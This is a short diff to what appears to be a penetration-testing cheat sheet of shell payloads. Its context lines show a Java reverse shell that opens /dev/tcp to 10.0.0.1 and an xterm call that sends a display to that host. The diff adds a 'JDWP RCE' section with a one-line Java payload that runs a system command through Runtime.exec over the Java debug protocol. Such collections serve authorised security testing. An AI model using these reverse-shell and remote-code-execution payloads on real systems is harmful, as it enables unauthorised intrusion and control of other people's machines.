@@ -182,6 +182,12 @@ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.
 xterm -display 10.0.0.1:1
 ```
 
+### JDWP RCE
+
+```java
+print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
+```
+
 ### Working with Restricted Shells
 
 ```bash
